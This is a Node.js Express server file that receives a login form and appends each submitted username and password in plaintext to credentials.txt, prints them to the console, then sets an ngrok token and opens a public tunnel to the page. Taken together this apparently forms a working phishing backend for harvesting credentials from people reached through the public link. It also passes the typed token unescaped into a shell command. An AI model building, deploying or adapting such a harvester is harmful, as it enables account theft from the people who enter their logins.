// server.js

const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const fs = require('fs');  // <-- needed for appending to file
const { execSync, spawn } = require('child_process');
const prompt = require('prompt-sync')({ sigint: true }); // so ctrl+c works

const app = express();
const port = 3000;

// middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// example route to capture the login form
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // format credential data
  const entry = `Username: ${username}, Password: ${password}\n`;

  // append to "credentials.txt"
  fs.appendFile('credentials.txt', entry, (err) => {
    if (err) {
      console.error('Failed to write to file:', err);
      return res
        .status(500)
        .send('<h2>There was an error saving your credentials. Check server logs.</h2>');
    }
    console.log(`Appended credentials to credentials.txt: ${username} / ${password}`);
    res.send('<h2>Thank you! Credentials have been saved to credentials.txt. Check the server console/log.</h2>');
  });
});

// request ngrok token
const token = prompt('Enter your ngrok auth token: ').trim();
if (!token) {
  console.error('No token provided. Exiting...');
  process.exit(1);
}

// add token to ngrok config
try {
  execSync(`ngrok config add-authtoken ${token}`, { stdio: 'inherit' });
  console.log('ngrok token set successfully!\n');
} catch (e) {
  console.error('Error setting ngrok token:', e.message);
  process.exit(1);
}

// start the local server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
  console.log('Starting ngrok tunnel...\n');

  // spawn ngrok in child process
  const ngrokProcess = spawn('ngrok', ['http', port.toString()], {
    stdio: 'inherit', // so we can see ngrok logs in our console
  });

  // if ngrok quits, we might want to shut down our server, or just do nothing
  ngrokProcess.on('close', (code) => {
    console.log(`ngrok process exited with code ${code}`);
    // process.exit(0);
  });
});
